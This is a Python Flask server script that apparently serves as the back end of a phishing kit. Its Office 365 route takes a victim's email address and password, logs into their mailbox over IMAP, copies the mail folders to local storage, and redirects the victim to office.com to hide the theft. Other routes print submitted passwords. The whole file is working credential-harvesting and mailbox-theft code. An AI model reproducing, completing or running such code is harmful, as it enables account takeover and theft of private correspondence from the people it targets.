#!/bin/python3

import sys
import imaplib
import getpass
from flask import (
    Flask,
    render_template,
    request, 
    jsonify,
    redirect
)
from processimap import process_imap_folders
import requests

clients = {
    1: "O365",
    2: "Google",
    3: "Other"
}

# Create the application instance
app = Flask(__name__)

# Create a URL route in our application for "/"
@app.route('/')
def home():
    return "<html><body><h1>hi there!</h1></body></html>"


#IMAP of Office 365 route
#TODO: Support THREADS. Need to return 302 or 403 to the client and continue the process on server side.
@app.route('/imapO365',methods=['POST'])
def imapO365():
    content = request.get_json(silent=True)
    print("IMAP O365 TRIGGERED")
    IMAP_SERVER = 'outlook.office365.com'
    EMAIL_ACCOUNT = content['email']
    PASSWORD = content['pass']
    OUTPUT_DIRECTORY = "Maildirs/Maildir_"+EMAIL_ACCOUNT
    M = imaplib.IMAP4_SSL(IMAP_SERVER)
    try:  
        M.login(EMAIL_ACCOUNT, PASSWORD)
    except:
        print("Creds are not good!")
        return "NOT OK",403

    process_imap_folders(M,OUTPUT_DIRECTORY)
    print("Creds are good!")
    return redirect("https://office.com", code=302)

#IMAP of Google route
#NOT YET IMPLEMENTED
#NEED TO SUPPORT OAUTH2
@app.route('/imapGoogle',methods=['POST'])
def imapGoogle():
    content = request.get_json(silent=True)
    print("IMAP GOOGLE TRIGGERED")
    IMAP_SERVER = 'imap.gmail.com'
    EMAIL_ACCOUNT = content['email']
    EMAIL_FOLDER = "/"
    PASSWORD = content['pass']
    OUTPUT_DIRECTORY = "./Maildirs/Maildir_"+EMAIL_ACCOUNT
    M = imaplib.IMAP4_SSL(IMAP_SERVER)
    M.login(EMAIL_ACCOUNT, PASSWORD)
    
    print(content['client'])
    return "OK"

#IMAP of Others
@app.route('/imapTry',methods=['POST'])
def imapTry():
    content = request.get_json(silent=True)
    print("IMAP OTHERS TRIGGERED")
    print(content['email'])
    print(content['pass'])
    print(content['client'])
    return "OK"


# If we're running in stand alone mode, run the application
if __name__ == '__main__':
    app.run(debug=True,port=5010)
